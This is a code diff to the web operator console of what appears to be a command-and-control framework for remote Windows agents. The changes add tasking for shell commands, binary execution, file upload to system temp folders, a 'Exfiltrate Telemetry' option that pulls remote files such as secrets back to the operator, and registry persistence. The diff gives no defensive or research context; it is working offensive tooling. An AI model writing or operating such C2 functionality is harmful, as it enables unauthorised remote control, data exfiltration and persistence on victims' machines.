@@ -139,16 +139,36 @@
           </div>
 
           <div class="task-controls">
-            <select id="task-type">
-              <option value="sysinfo">Telemetry Analysis</option>
-              <option value="shell">Shell Orchestration</option>
-              <option value="persist">Persistence Vector</option>
+            <select id="task-type" onchange="updatePlaceholder()">
+              <option value="sysinfo">Telemetry Analysis (Sysinfo)</option>
+              <option value="shell">Shell Orchestration (cmd / c)</option>
+              <option value="exec">Direct Binary Execution (Exec)</option>
+              <option value="upload">Deploy Artifact (Upload)</option>
+              <option value="download">Exfiltrate Telemetry (Download)</option>
+              <option value="persist">Persistence Vector (Registry)</option>
             </select>
             <input
               type="text"
               id="task-command"
               placeholder="Enter configuration payload..."
               style="flex-grow: 1"
+            />
+            <button
+              id="browse-btn"
+              style="
+                background: rgba(255, 255, 255, 0.05);
+                color: white;
+                display: none;
+              "
+              onclick="document.getElementById('file-input').click()"
+            >
+              Browse...
+            </button>
+            <input
+              type="file"
+              id="file-input"
+              style="display: none"
+              onchange="onFileSelected()"
             />
             <button onclick="sendTask()">Execute Job</button>
           </div>
@@ -198,6 +218,7 @@
 
     <script>
       let activeAgentId = null;
+      let selectedFileData = null;
       const accessToken = localStorage.getItem("access_token");
 
       if (!accessToken) {
@@ -208,6 +229,7 @@
         options.headers = {
           ...options.headers,
           Authorization: `Bearer ${accessToken}`,
+          "Content-Type": "application/json",
         };
         const response = await fetch(url, options);
         if (response.status === 401) {
@@ -333,13 +355,30 @@
           tasks.forEach((task) => {
             const row = document.createElement("tr");
             let outcome = `<i style="color: var(--text-muted)">Awaiting execution...</i>`;
-            if (task.status === "leased")
+
+            if (task.status === "leased") {
               outcome = `<span style="color: var(--accent)">Node processing...</span>`;
-            else if (task.status === "failed")
+            } else if (task.status === "failed") {
               outcome = `<div class="result-block" style="border-color: var(--danger)">${
                 task.result?.error || "Execution Error"
               }</div>`;
-            else if (task.result) {
+            } else if (
+              task.status === "completed" &&
+              task.type === "download" &&
+              task.result?.content
+            ) {
+              const filename = task.result.filename || "downloaded_file";
+              outcome = `
+                    <div style="display: flex; align-items: center; gap: 10px;">
+                        <span style="color: var(--success)">File ready (${(
+                          task.result.size / 1024
+                        ).toFixed(1)} KB)</span>
+                        <button onclick="downloadBlob('${
+                          task.result.content
+                        }', '${filename}')" style="padding: 4px 10px; font-size: 0.7rem;">Save File</button>
+                    </div>
+                `;
+            } else if (task.result) {
               const out =
                 task.result.stdout ||
                 JSON.stringify(task.result.info || task.result, null, 2);
@@ -365,17 +404,79 @@
         } catch (e) {}
       }
 
+      function downloadBlob(base64, filename) {
+        const link = document.createElement("a");
+        link.href = "data:application/octet-stream;base64," + base64;
+        link.download = filename;
+        link.click();
+      }
+
+      function updatePlaceholder() {
+        const type = document.getElementById("task-type").value;
+        const input = document.getElementById("task-command");
+        const browseBtn = document.getElementById("browse-btn");
+
+        browseBtn.style.display = type === "upload" ? "inline-block" : "none";
+
+        const mapping = {
+          sysinfo: "Telemetry analysis (no input required)...",
+          shell: "System command (e.g. whoami or net user)...",
+          exec: "Direct binary path (e.g. C:\\Windows\\System32\\calc.exe)...",
+          upload: "Destination folder (e.g. C:\\Windows\\temp\\)...",
+          download:
+            "Remote file path to exfiltrate (e.g. C:\\Users\\Public\\secret.txt)...",
+          persist: "Registry key name for persistence (optional)...",
+        };
+        input.placeholder = mapping[type] || "Enter configuration payload...";
+      }
+
+      function onFileSelected() {
+        const file = document.getElementById("file-input").files[0];
+        if (!file) return;
+        const reader = new FileReader();
+        reader.onload = function (e) {
+          selectedFileData = {
+            filename: file.name,
+            content: e.target.result.split(",")[1],
+            size: file.size,
+          };
+          document.getElementById("task-command").value =
+            "Ready to upload: " + file.name;
+        };
+        reader.readAsDataURL(file);
+      }
+
       async function sendTask() {
         const type = document.getElementById("task-type").value;
         const command = document.getElementById("task-command").value;
         if (!activeAgentId) return;
+
+        let taskReq = {
+          agent_id: activeAgentId,
+          task_type: type,
+        };
+
+        if (type === "upload" && selectedFileData) {
+          let destPath = command
+            .replace("Ready to upload: " + selectedFileData.filename, "")
+            .trim();
+          if (!destPath) destPath = "C:\\Windows\\Temp\\";
+          taskReq.payload = {
+            filename: selectedFileData.filename,
+            content: selectedFileData.content,
+            path: destPath,
+          };
+          selectedFileData = null;
+          document.getElementById("file-input").value = "";
+        } else {
+          taskReq.command = command;
+        }
+
         try {
-          await apiFetch(
-            `/operator/tasks?agent_id=${activeAgentId}&task_type=${type}&command=${encodeURIComponent(
-              command
-            )}`,
-            { method: "POST" }
-          );
+          await apiFetch(`/operator/tasks`, {
+            method: "POST",
+            body: JSON.stringify(taskReq),
+          });
           document.getElementById("task-command").value = "";
           fetchHistory();
         } catch (e) {
